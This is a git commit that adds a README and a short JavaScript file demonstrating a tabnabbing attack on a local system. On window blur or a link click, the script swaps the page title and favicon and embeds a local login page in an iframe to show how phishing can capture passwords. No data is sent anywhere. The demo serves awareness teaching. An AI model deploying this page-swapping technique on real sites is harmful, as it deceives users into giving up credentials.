a00c9aa1a70b9fe310c889f2956c6ee04d5145a7
Siddhartha Vibhu Pharswan <29783080+sidvip@users.noreply.github.com>
2019-10-13 22:42:35 +0530

    Tab nabbing attack on local system ...
    Can use this link also https://blog.securelayer7.net/tabnabbing-art-phishing/

---
+++ ReadMe.md
@@ -0,0 +1,11 @@
+# HYAO :-> Hack Yourself At Once
+
+## TAB Nabbing :- Description
+
+* In this project we are trying to demostrate how tabnabbing attack works in real time situations while working over multiple tabs if user unfortuantely land up in fishy links and websites..
+
+## Usage
+
+1- `Open the mainPage.html in your browser rest of the things you will come to know automatically ....`
+
+
---
+++ javascript/tabnabbingScript.js
@@ -0,0 +1,26 @@
+let linkActive = document.querySelector('.link-clicked');
+
+function commonFunction() {
+    document.getElementsByClassName('tabNabber')[0].innerHTML = `
+      <img src='../images/hacked.jpg' class='big'>
+      <h2 style='font-size:25px; text-align:center;'> Hacked Using Tab Nabbing See the Icon and Title of the Browser 
+      .... by this way you can be redirected to trusted websites to get the passwords</h2>
+      <iframe src="../loginPage.html" name='login' height="400vw;" width="1500vw";></iframe>
+    `;
+    document.title = 'Hacked Now!';
+    let link = document.querySelector("link[rel*=icon]");
+    link.rel = 'icon';
+    link.href = '../images/hacker.png';
+}
+
+
+function attackFunction() {
+    commonFunction();
+}
+
+function linkAttack() {
+    commonFunction();
+}
+
+linkActive.addEventListener("click", linkAttack);
+window.addEventListener('blur', attackFunction);
